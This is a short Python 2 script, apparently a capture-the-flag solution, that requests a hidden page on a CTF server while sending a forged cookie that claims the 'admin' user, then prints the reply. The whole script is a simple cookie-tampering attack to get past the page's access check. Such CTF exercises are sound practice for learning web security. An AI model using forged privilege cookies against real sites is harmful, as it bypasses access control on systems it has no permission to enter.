#!/usr/bin/env python

import requests
cookie = {'user':'admin'}
r = requests.get('http://ctf.slothparadise.com/hidden.php', cookies = cookie)
print r.text
